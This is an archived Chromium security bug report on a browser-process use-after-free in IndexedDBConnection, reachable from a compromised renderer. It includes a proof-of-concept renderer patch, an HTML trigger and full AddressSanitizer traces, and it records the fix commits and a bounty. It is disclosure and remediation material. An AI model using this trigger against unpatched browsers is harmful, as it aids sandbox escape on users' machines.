# Security: Sandbox Escape - Use After Free with IndexedDBConnection

| Field | Value |
|-------|-------|
| **Issue ID** | [40091372](https://issues.chromium.org/issues/40091372) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Storage>IndexedDB |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | lo...@gmail.com |
| **Assignee** | dm...@chromium.org |
| **Created** | 2018-05-15 |
| **Bounty** | $10,000.00 |

## Description

**VULNERABILITY DETAILS**

```
IndexedDBTransaction holds a raw pointer to IndexedDBConnection:  

	class CONTENT_EXPORT IndexedDBTransaction {  
	  ...  
	  IndexedDBConnection\* connection_;  
	    
When IndexedDB is force closed while open rquest is still in progress, the IndexedDBConnection object can be freed inside database_->TransactionFinished(), afterwards the dereference of connection_ becomes Use After Free:  

	void IndexedDBTransaction::Abort(const IndexedDBDatabaseError& error) {  
	...  
	  database_->TransactionFinished(this, false);  

	  // RemoveTransaction will delete |this|.  
	  connection_->RemoveTransaction(id_);  
	}  

Normaly force close is not possible from Javascript. However, a compromised renderer can easily fire a database delete request with force close right after a open request.  
This bug can be leveraged to escape the sandbox from a compromised renderrer process.  


  
Steps to reproduce:  
  
1. Apply the renderer patch UAF_IndexedDBConnection_PoC_renderrer_patch.txt  and generate ASAN build.  
2. Open UAF_IndexedDBConnection_PoC.html in the generated ASAN build.  
2. ASAN reports a Use After Free with IndexedDBConnection in browser process.  

=================================================================  
==15276==ERROR: AddressSanitizer: heap-use-after-free on address 0x502327ec at pc 0x14b88f4b bp 0x2113e0a0 sp 0x2113e094  
READ of size 4 at 0x502327ec thread T14  
	#0 0x14b88f4a in std::_Hash<std::_Umap_traits<unsigned long long,disk_cache::EntryMetadata,std::_Uhash_compare<unsigned long long,std::hash<unsigned long long>,std::equal_to<unsigned long long> >,std::allocator<std::pair<const unsigned long long,disk_cache::EntryMetadata> >,0> >::equal_range C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.12.25827\include\xhash:718  
	#1 0x117c9a49 in std::_Hash<std::_Umap_traits<long long,std::unique_ptr<content::IndexedDBTransaction,std::default_delete<content::IndexedDBTransaction> >,std::_Uhash_compare<long long,std::hash<long long>,std::equal_to<long long> >,std::allocator<std::pair<const long long,std::unique_ptr<content::IndexedDBTransaction,std::default_delete<content::IndexedDBTransaction> > > >,0> >::erase C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.12.25827\include\xhash:625  
	#2 0x117c9963 in content::IndexedDBConnection::RemoveTransaction c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_connection.cc:154  

```

**VERSION**  

Chrome Version: Chromium 68.0.3414.0 (Developer Build) (32-bit)  

Operating System: Windows 10

**REPRODUCTION CASE**

```
Renderrer patch (UAF_IndexedDBConnection_PoC_renderrer_patch.txt):  
  
diff --git a/content/renderer/indexed_db/webidbfactory_impl.cc b/content/renderer/indexed_db/webidbfactory_impl.cc  
index 753c35a361f3..c79518f58880 100644  
--- a/content/renderer/indexed_db/webidbfactory_impl.cc  
+++ b/content/renderer/indexed_db/webidbfactory_impl.cc  
@@ -163,6 +163,9 @@ void WebIDBFactoryImpl::IOThreadHelper::Open(  
   GetService()->Open(GetCallbacksProxy(std::move(callbacks)),  
					  GetDatabaseCallbacksProxy(std::move(database_callbacks)),  
					  origin, name, version, transaction_id);  
+  CallbacksAssociatedPtrInfo ptr_info;  
+  auto request = mojo::MakeRequest(&ptr_info);  
+  GetService()->DeleteDatabase(std::move(ptr_info), origin, name, true);  
 }  

Web page entry point (UAF_IndexedDBConnection_PoC.html):  
  
<script>  
indexedDB.open("TestDb1",  1);  
</script>  

```

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: browser  

Crash State:

```
=================================================================  
==15276==ERROR: AddressSanitizer: heap-use-after-free on address 0x502327ec at pc 0x14b88f4b bp 0x2113e0a0 sp 0x2113e094  
READ of size 4 at 0x502327ec thread T14  
	#0 0x14b88f4a in std::_Hash<std::_Umap_traits<unsigned long long,disk_cache::EntryMetadata,std::_Uhash_compare<unsigned long long,std::hash<unsigned long long>,std::equal_to<unsigned long long> >,std::allocator<std::pair<const unsigned long long,disk_cache::EntryMetadata> >,0> >::equal_range C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.12.25827\include\xhash:718  
	#1 0x117c9a49 in std::_Hash<std::_Umap_traits<long long,std::unique_ptr<content::IndexedDBTransaction,std::default_delete<content::IndexedDBTransaction> >,std::_Uhash_compare<long long,std::hash<long long>,std::equal_to<long long> >,std::allocator<std::pair<const long long,std::unique_ptr<content::IndexedDBTransaction,std::default_delete<content::IndexedDBTransaction> > > >,0> >::erase C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.12.25827\include\xhash:625  
	#2 0x117c9963 in content::IndexedDBConnection::RemoveTransaction c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_connection.cc:154  
	#3 0x11898638 in content::IndexedDBTransaction::Abort c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_transaction.cc:225  
	#4 0x117c92db in content::IndexedDBConnection::AbortAllTransactions c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_connection.cc:132  
	#5 0x11803289 in content::IndexedDBDatabase::Close c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1892  
	#6 0x117c76f2 in content::IndexedDBConnection::ForceClose c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_connection.cc:55  
	#7 0x11802ea5 in content::IndexedDBDatabase::ForceClose c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1870  
	#8 0x118028b1 in content::IndexedDBDatabase::DeleteDatabase c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1853  
	#9 0x11839152 in content::IndexedDBFactoryImpl::DeleteDatabase c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_factory_impl.cc:422  
	#10 0x11821526 in content::IndexedDBDispatcherHost::IDBSequenceHelper::DeleteDatabaseOnIDBThread c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_dispatcher_host.cc:332  
	#11 0x118324b0 in base::internal::FunctorTraits<void (content::IndexedDBDispatcherHost::IDBSequenceHelper::\*)(scoped_refptr<content::IndexedDBCallbacks>, const url::Origin &, const std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &, bool) __attribute__((thiscall)),void>::Invoke<void (content::IndexedDBDispatcherHost::IDBSequenceHelper::\*)(scoped_refptr<content::IndexedDBCallbacks>, const url::Origin &, const std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &, bool) __attribute__((thiscall)),content::IndexedDBDispatcherHost::IDBSequenceHelper \*,scoped_refptr<content::IndexedDBCallbacks>,url::Origin,std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >,bool> c:\opensrc\chromium\src\base\bind_internal.h:447  
	#12 0x11832279 in base::internal::Invoker<base::internal::BindState<void (content::IndexedDBDispatcherHost::IDBSequenceHelper::\*)(scoped_refptr<content::IndexedDBCallbacks>, const url::Origin &, const std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &, bool) __attribute__((thiscall)),base::internal::UnretainedWrapper<content::IndexedDBDispatcherHost::IDBSequenceHelper>,scoped_refptr<content::IndexedDBCallbacks>,url::Origin,std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >,bool>,void ()>::RunOnce c:\opensrc\chromium\src\base\bind_internal.h:589  
	#13 0x1371c913 in base::debug::TaskAnnotator::RunTask c:\opensrc\chromium\src\base\debug\task_annotator.cc:101  
	#14 0x13701813 in base::internal::TaskTracker::RunOrSkipTask c:\opensrc\chromium\src\base\task_scheduler\task_tracker.cc:479  
	#15 0x13700130 in base::internal::TaskTracker::RunAndPopNextTask c:\opensrc\chromium\src\base\task_scheduler\task_tracker.cc:372  
	#16 0x1371f0dd in base::internal::SchedulerWorker::ThreadMain c:\opensrc\chromium\src\base\task_scheduler\scheduler_worker.cc:205  
	#17 0x1347e46b in base::`anonymous namespace'::ThreadFunc c:\opensrc\chromium\src\base\threading\platform_thread_win.cc:91  
	#18 0x13128c4 in __asan::AsanThread::ThreadStart c:\b\rr\tmpm5zxwy\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_thread.cc:259  
	#19 0x131153e in asan_thread_start c:\b\rr\tmpm5zxwy\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:136  
	#20 0x771c8673 in BaseThreadInitThunk+0x23 (C:\WINDOWS\System32\KERNEL32.DLL+0x6b818673)  
	#21 0x77a94b46 in RtlGetAppContainerNamedObjectPath+0x136 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e4b46)  
	#22 0x77a94b16 in RtlGetAppContainerNamedObjectPath+0x106 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e4b16)  

0x502327ec is located 44 bytes inside of 76-byte region [0x502327c0,0x5023280c)  
freed by thread T14 here:  
	#0 0x1318f78 in free c:\b\rr\tmpm5zxwy\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:44  
	#1 0x117c9bf4 in content::IndexedDBConnection::~IndexedDBConnection c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_connection.cc:34  
	#2 0x11815d40 in content::IndexedDBDatabase::OpenRequest::~OpenRequest c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:114  
	#3 0x11801945 in content::IndexedDBDatabase::RequestComplete c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1791  
	#4 0x118184bf in content::IndexedDBDatabase::OpenRequest::UpgradeTransactionFinished c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:273  
	#5 0x11801071 in content::IndexedDBDatabase::TransactionFinished c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1777  
	#6 0x11898600 in content::IndexedDBTransaction::Abort c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_transaction.cc:222  
	#7 0x117c92db in content::IndexedDBConnection::AbortAllTransactions c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_connection.cc:132  
	#8 0x11803289 in content::IndexedDBDatabase::Close c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1892  
	#9 0x117c76f2 in content::IndexedDBConnection::ForceClose c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_connection.cc:55  
	#10 0x11802ea5 in content::IndexedDBDatabase::ForceClose c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1870  
	#11 0x118028b1 in content::IndexedDBDatabase::DeleteDatabase c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1853  
	#12 0x11839152 in content::IndexedDBFactoryImpl::DeleteDatabase c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_factory_impl.cc:422  
	#13 0x11821526 in content::IndexedDBDispatcherHost::IDBSequenceHelper::DeleteDatabaseOnIDBThread c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_dispatcher_host.cc:332  
	#14 0x118324b0 in base::internal::FunctorTraits<void (content::IndexedDBDispatcherHost::IDBSequenceHelper::\*)(scoped_refptr<content::IndexedDBCallbacks>, const url::Origin &, const std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &, bool) __attribute__((thiscall)),void>::Invoke<void (content::IndexedDBDispatcherHost::IDBSequenceHelper::\*)(scoped_refptr<content::IndexedDBCallbacks>, const url::Origin &, const std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &, bool) __attribute__((thiscall)),content::IndexedDBDispatcherHost::IDBSequenceHelper \*,scoped_refptr<content::IndexedDBCallbacks>,url::Origin,std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >,bool> c:\opensrc\chromium\src\base\bind_internal.h:447  
	#15 0x11832279 in base::internal::Invoker<base::internal::BindState<void (content::IndexedDBDispatcherHost::IDBSequenceHelper::\*)(scoped_refptr<content::IndexedDBCallbacks>, const url::Origin &, const std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &, bool) __attribute__((thiscall)),base::internal::UnretainedWrapper<content::IndexedDBDispatcherHost::IDBSequenceHelper>,scoped_refptr<content::IndexedDBCallbacks>,url::Origin,std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >,bool>,void ()>::RunOnce c:\opensrc\chromium\src\base\bind_internal.h:589  
	#16 0x1371c913 in base::debug::TaskAnnotator::RunTask c:\opensrc\chromium\src\base\debug\task_annotator.cc:101  
	#17 0x13701813 in base::internal::TaskTracker::RunOrSkipTask c:\opensrc\chromium\src\base\task_scheduler\task_tracker.cc:479  
	#18 0x13700130 in base::internal::TaskTracker::RunAndPopNextTask c:\opensrc\chromium\src\base\task_scheduler\task_tracker.cc:372  
	#19 0x1371f0dd in base::internal::SchedulerWorker::ThreadMain c:\opensrc\chromium\src\base\task_scheduler\scheduler_worker.cc:205  
	#20 0x1347e46b in base::`anonymous namespace'::ThreadFunc c:\opensrc\chromium\src\base\threading\platform_thread_win.cc:91  
	#21 0x13128c4 in __asan::AsanThread::ThreadStart c:\b\rr\tmpm5zxwy\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_thread.cc:259  
	#22 0x131153e in asan_thread_start c:\b\rr\tmpm5zxwy\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:136  
	#23 0x771c8673 in BaseThreadInitThunk+0x23 (C:\WINDOWS\System32\KERNEL32.DLL+0x6b818673)  
	#24 0x77a94b46 in RtlGetAppContainerNamedObjectPath+0x136 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e4b46)  
	#25 0x77a94b16 in RtlGetAppContainerNamedObjectPath+0x106 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e4b16)  

previously allocated by thread T14 here:  
	#0 0x131905c in malloc c:\b\rr\tmpm5zxwy\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:60  
	#1 0x1aa66ec5 in operator new f:\dd\vctools\crt\vcstartup\src\heap\new_scalar.cpp:34  
	#2 0x117e320c in std::make_unique<content::IndexedDBConnection,int &,content::IndexedDBDatabase \*,scoped_refptr<content::IndexedDBDatabaseCallbacks> &,0> C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.12.25827\include\memory:2585  
	#3 0x117e2f6b in content::IndexedDBDatabase::CreateConnection c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:482  
	#4 0x11818857 in content::IndexedDBDatabase::OpenRequest::StartUpgrade c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:235  
	#5 0x11816c6c in content::IndexedDBDatabase::OpenRequest::Perform c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:195  
	#6 0x118016cd in content::IndexedDBDatabase::ProcessRequestQueue c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1811  
	#7 0x118014ad in content::IndexedDBDatabase::AppendRequest c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1786  
	#8 0x11802417 in content::IndexedDBDatabase::OpenConnection c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_database.cc:1843  
	#9 0x1183ebd8 in content::IndexedDBFactoryImpl::Open c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_factory_impl.cc:720  
	#10 0x11820665 in content::IndexedDBDispatcherHost::IDBSequenceHelper::OpenOnIDBThread c:\opensrc\chromium\src\content\browser\indexed_db\indexed_db_dispatcher_host.cc:318  
	#11 0x11831dd0 in base::internal::FunctorTraits<void (content::IndexedDBDispatcherHost::IDBSequenceHelper::\*)(scoped_refptr<content::IndexedDBCallbacks>, scoped_refptr<content::IndexedDBDatabaseCallbacks>, const url::Origin &, const std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &, long long, long long) __attribute__((thiscall)),void>::Invoke<void (content::IndexedDBDispatcherHost::IDBSequenceHelper::\*)(scoped_refptr<content::IndexedDBCallbacks>, scoped_refptr<content::IndexedDBDatabaseCallbacks>, const url::Origin &, const std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &, long long, long long) __attribute__((thiscall)),content::IndexedDBDispatcherHost::IDBSequenceHelper \*,scoped_refptr<content::IndexedDBCallbacks>,scoped_refptr<content::IndexedDBDatabaseCallbacks>,url::Origin,std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >,long long,long long> c:\opensrc\chromium\src\base\bind_internal.h:447  
	#12 0x11831ad1 in base::internal::Invoker<base::internal::BindState<void (content::IndexedDBDispatcherHost::IDBSequenceHelper::\*)(scoped_refptr<content::IndexedDBCallbacks>, scoped_refptr<content::IndexedDBDatabaseCallbacks>, const url::Origin &, const std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &, long long, long long) __attribute__((thiscall)),base::internal::UnretainedWrapper<content::IndexedDBDispatcherHost::IDBSequenceHelper>,scoped_refptr<content::IndexedDBCallbacks>,scoped_refptr<content::IndexedDBDatabaseCallbacks>,url::Origin,std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >,long long,long long>,void ()>::RunOnce c:\opensrc\chromium\src\base\bind_internal.h:589  
	#13 0x1371c913 in base::debug::TaskAnnotator::RunTask c:\opensrc\chromium\src\base\debug\task_annotator.cc:101  
	#14 0x13701813 in base::internal::TaskTracker::RunOrSkipTask c:\opensrc\chromium\src\base\task_scheduler\task_tracker.cc:479  
	#15 0x13700130 in base::internal::TaskTracker::RunAndPopNextTask c:\opensrc\chromium\src\base\task_scheduler\task_tracker.cc:372  
	#16 0x1371f0dd in base::internal::SchedulerWorker::ThreadMain c:\opensrc\chromium\src\base\task_scheduler\scheduler_worker.cc:205  
	#17 0x1347e46b in base::`anonymous namespace'::ThreadFunc c:\opensrc\chromium\src\base\threading\platform_thread_win.cc:91  
	#18 0x13128c4 in __asan::AsanThread::ThreadStart c:\b\rr\tmpm5zxwy\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_thread.cc:259  
	#19 0x131153e in asan_thread_start c:\b\rr\tmpm5zxwy\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:136  
	#20 0x771c8673 in BaseThreadInitThunk+0x23 (C:\WINDOWS\System32\KERNEL32.DLL+0x6b818673)  
	#21 0x77a94b46 in RtlGetAppContainerNamedObjectPath+0x136 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e4b46)  
	#22 0x77a94b16 in RtlGetAppContainerNamedObjectPath+0x106 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e4b16)  

Thread T14 created by T0 here:  
	#0 0x1311642 in __asan_wrap_CreateThread c:\b\rr\tmpm5zxwy\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:146  
	#1 0x1347dc2c in base::`anonymous namespace'::CreateThreadInternal c:\opensrc\chromium\src\base\threading\platform_thread_win.cc:130  
	#2 0x1347db03 in base::PlatformThread::CreateWithPriority c:\opensrc\chromium\src\base\threading\platform_thread_win.cc:207  
	#3 0x1371e65c in base::internal::SchedulerWorker::Start c:\opensrc\chromium\src\base\task_scheduler\scheduler_worker.cc:67  
	#4 0x137124be in base::internal::SchedulerWorkerPoolImpl::CreateRegisterAndStartSchedulerWorkerLockRequired c:\opensrc\chromium\src\base\task_scheduler\scheduler_worker_pool_impl.cc:850  
	#5 0x13711b37 in base::internal::SchedulerWorkerPoolImpl::Start c:\opensrc\chromium\src\base\task_scheduler\scheduler_worker_pool_impl.cc:237  
	#6 0x136e1985 in base::internal::TaskSchedulerImpl::Start c:\opensrc\chromium\src\base\task_scheduler\task_scheduler_impl.cc:118  
	#7 0x111bca86 in content::BrowserMainLoop::CreateThreads c:\opensrc\chromium\src\content\browser\browser_main_loop.cc:923  
	#8 0x12034b5f in content::StartupTaskRunner::RunAllTasksNow c:\opensrc\chromium\src\content\browser\startup_task_runner.cc:45  
	#9 0x111bc11f in content::BrowserMainLoop::CreateStartupTasks c:\opensrc\chromium\src\content\browser\browser_main_loop.cc:871  
	#10 0x111c8c3b in content::BrowserMainRunnerImpl::Initialize c:\opensrc\chromium\src\content\browser\browser_main_runner.cc:140  
	#11 0x111b4c63 in content::BrowserMain c:\opensrc\chromium\src\content\browser\browser_main.cc:42  
	#12 0x12fb3d04 in content::RunNamedProcessTypeMain c:\opensrc\chromium\src\content\app\content_main_runner.cc:634  
	#13 0x12fb4e40 in content::ContentMainRunnerImpl::Run c:\opensrc\chromium\src\content\app\content_main_runner.cc:930  
	#14 0x13026d9c in service_manager::Main c:\opensrc\chromium\src\services\service_manager\embedder\main.cc:452  
	#15 0x12fb3a31 in content::ContentMain c:\opensrc\chromium\src\content\app\content_main.cc:19  
	#16 0xf85132b in ChromeMain c:\opensrc\chromium\src\chrome\app\chrome_main.cc:101  
	#17 0xfd7fe6 in MainDllLoader::Launch c:\opensrc\chromium\src\chrome\app\main_dll_loader_win.cc:200  
	#18 0xfd1a77 in main c:\opensrc\chromium\src\chrome\app\chrome_exe_main_win.cc:230  
	#19 0x132d13a in __scrt_common_main_seh f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl:283  
	#20 0x771c8673 in BaseThreadInitThunk+0x23 (C:\WINDOWS\System32\KERNEL32.DLL+0x6b818673)  
	#21 0x77a94b46 in RtlGetAppContainerNamedObjectPath+0x136 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e4b46)  
	#22 0x77a94b16 in RtlGetAppContainerNamedObjectPath+0x106 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e4b16)  

SUMMARY: AddressSanitizer: heap-use-after-free C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.12.25827\include\xhash:718 in std::_Hash<std::_Umap_traits<unsigned long long,disk_cache::EntryMetadata,std::_Uhash_compare<unsigned long long,std::hash<unsigned long long>,std::equal_to<unsigned long long> >,std::allocator<std::pair<const unsigned long long,disk_cache::EntryMetadata> >,0> >::equal_range  
Shadow bytes around the buggy address:  
  0x3a0464a0: fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa  
  0x3a0464b0: fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa  
  0x3a0464c0: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fd fd  
  0x3a0464d0: fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00  
  0x3a0464e0: 00 00 00 00 00 04 fa fa fa fa 00 00 00 00 00 00  
=>0x3a0464f0: 00 00 00 00 fa fa fa fa fd fd fd fd fd[fd]fd fd  
  0x3a046500: fd fd fa fa fa fa fd fd fd fd fd fd fd fd fd fa  
  0x3a046510: fa fa fa fa 00 00 00 00 00 00 00 00 00 04 fa fa  
  0x3a046520: fa fa 00 00 00 00 00 00 00 00 00 fa fa fa fa fa  
  0x3a046530: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fd fd  
  0x3a046540: fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd  
Shadow byte legend (one shadow byte represents 8 application bytes):  
  Addressable:           00  
  Partially addressable: 01 02 03 04 05 06 07  
  Heap left redzone:       fa  
  Freed heap region:       fd  
  Stack left redzone:      f1  
  Stack mid redzone:       f2  
  Stack right redzone:     f3  
  Stack after return:      f5  
  Stack use after scope:   f8  
  Global redzone:          f9  
  Global init order:       f6  
  Poisoned by user:        f7  
  Container overflow:      fc  
  Array cookie:            ac  
  Intra object redzone:    bb  
  ASan internal:           fe  
  Left alloca redzone:     ca  
  Right alloca redzone:    cb  
==15276==ABORTING

```

## Attachments

- [UAF_IndexedDBConnection_PoC_renderrer_patch.txt](attachments/UAF_IndexedDBConnection_PoC_renderrer_patch.txt) (text/plain, 777 B)
- [UAF_IndexedDBConnection_PoC.html](attachments/UAF_IndexedDBConnection_PoC.html) (text/plain, 51 B)

## Timeline

### me...@chromium.org (2018-05-15)

I reproduced this on trunk. Labeling High per the guidelines on memory corruption in browser from a compromised renderer.

dmurph@ can you please take a look at this?
CCing more people for greater visibility.

[Monorail components: Blink>Storage>IndexedDB]

### js...@chromium.org (2018-05-15)

Yep, dmurph@ - please take a look.

### me...@chromium.org (2018-05-15)

Reproduced this on stable

### dm...@chromium.org (2018-05-15)

I'll jump on this.

### sh...@chromium.org (2018-05-16)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-05-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/28044cb7ef4488e7278c2b80f0e3a2c3707d03b6

commit 28044cb7ef4488e7278c2b80f0e3a2c3707d03b6
Author: Daniel Murphy <dmurph@chromium.org>
Date: Thu May 17 01:23:21 2018

[IndexedDB] Fixing early destruction of connection during forceclose

Patch is as small as possible for merging.

Bug: 842990
Change-Id: I9968ffee1bf3279e61e1ec13e4d541f713caf12f
Reviewed-on: https://chromium-review.googlesource.com/1062935
Commit-Queue: Daniel Murphy <dmurph@chromium.org>
Commit-Queue: Victor Costan <pwnall@chromium.org>
Reviewed-by: Victor Costan <pwnall@chromium.org>
Cr-Commit-Position: refs/heads/master@{#559383}
[modify] https://crrev.com/28044cb7ef4488e7278c2b80f0e3a2c3707d03b6/content/browser/indexed_db/indexed_db_database.cc
[modify] https://crrev.com/28044cb7ef4488e7278c2b80f0e3a2c3707d03b6/content/browser/indexed_db/indexed_db_transaction.cc
[modify] https://crrev.com/28044cb7ef4488e7278c2b80f0e3a2c3707d03b6/content/browser/indexed_db/indexed_db_transaction.h


### dm...@chromium.org (2018-05-17)

[Empty comment from Monorail migration]

### dm...@chromium.org (2018-05-17)

Also requesting a 66 merge, but I'll leave whether that is needed up to the security team (and also whether it needs a release - I'm guessing maybe we do the merge but don't do a release, and if more things need a release then it'll be in there)

### dm...@chromium.org (2018-05-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-05-17)

This bug requires manual review: We are only 11 days from stable.
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2018-05-17)

[Comment Deleted]

### go...@chromium.org (2018-05-17)

+awhalley@ (Security TPM) for M67 merge review (CL listed at #6 didn't make it to canary yet)

### sh...@chromium.org (2018-05-18)

[Empty comment from Monorail migration]

### aw...@google.com (2018-05-21)

govind@ - good for 67

### go...@chromium.org (2018-05-21)

Approving merge to M67 branch 3396 based on https://crbug.com/chromium/842990#c14. Please merge ASAP so we can pick it up for this week last M67 beta release on Wednesday. Thank you.

### bu...@chromium.org (2018-05-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/3d96fb535b505ad0624f18670c87a5f7d3a64837

commit 3d96fb535b505ad0624f18670c87a5f7d3a64837
Author: Daniel Murphy <dmurph@chromium.org>
Date: Mon May 21 17:44:14 2018

[IndexedDB] Fixing early destruction of connection during forceclose

Patch is as small as possible for merging.

Bug: 842990
Change-Id: I9968ffee1bf3279e61e1ec13e4d541f713caf12f
Reviewed-on: https://chromium-review.googlesource.com/1062935
Commit-Queue: Daniel Murphy <dmurph@chromium.org>
Commit-Queue: Victor Costan <pwnall@chromium.org>
Reviewed-by: Victor Costan <pwnall@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#559383}(cherry picked from commit 28044cb7ef4488e7278c2b80f0e3a2c3707d03b6)
Reviewed-on: https://chromium-review.googlesource.com/1067057
Reviewed-by: Daniel Murphy <dmurph@chromium.org>
Cr-Commit-Position: refs/branch-heads/3396@{#662}
Cr-Branched-From: 9ef2aa869bc7bc0c089e255d698cca6e47d6b038-refs/heads/master@{#550428}
[modify] https://crrev.com/3d96fb535b505ad0624f18670c87a5f7d3a64837/content/browser/indexed_db/indexed_db_database.cc
[modify] https://crrev.com/3d96fb535b505ad0624f18670c87a5f7d3a64837/content/browser/indexed_db/indexed_db_transaction.cc
[modify] https://crrev.com/3d96fb535b505ad0624f18670c87a5f7d3a64837/content/browser/indexed_db/indexed_db_transaction.h


### ab...@google.com (2018-05-21)

Rejecting merge for M66, since M67 is a week away.

### aw...@chromium.org (2018-05-21)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### va...@chromium.org (2018-05-30)

dmurph@ -- would it be possible to may be add a unit test for this? Thanks.

### aw...@chromium.org (2018-06-04)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2018-06-04)

Nice one loobenyang@! $10,000 for this report!

### aw...@chromium.org (2018-06-04)

[Empty comment from Monorail migration]

### lo...@gmail.com (2018-06-04)

[Comment Deleted]

### sh...@chromium.org (2018-08-24)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-01-04)

[Empty comment from Monorail migration]

### is...@google.com (2019-01-04)

